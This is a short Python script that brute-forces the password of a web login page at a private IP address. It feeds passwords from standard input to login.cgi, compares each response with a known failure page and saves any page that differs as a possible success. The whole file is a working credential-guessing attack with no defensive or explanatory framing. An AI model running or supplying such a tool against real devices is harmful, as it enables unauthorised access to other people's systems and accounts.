import sys, time
import requests

wrong = requests.post("http://10.50.1.57/login.cgi", data={"password": "wrong"}).text
open("wrong.html", "w").write(wrong)

for f in sys.stdin:
	password = f.strip()
	while True:
		try:
			resp = requests.post("http://10.50.1.57/login.cgi", data={"password": password}) 
			break
		except requests.RequestException as e:
			print "trying", password, " - error:", e
			time.sleep(1)

	if resp.text == wrong: 
		print "trying", password, " - invalid"
	else:
		print "trying", password, " - MAYBE"
		open("right-%s.html" % password, "w").write(resp.text)

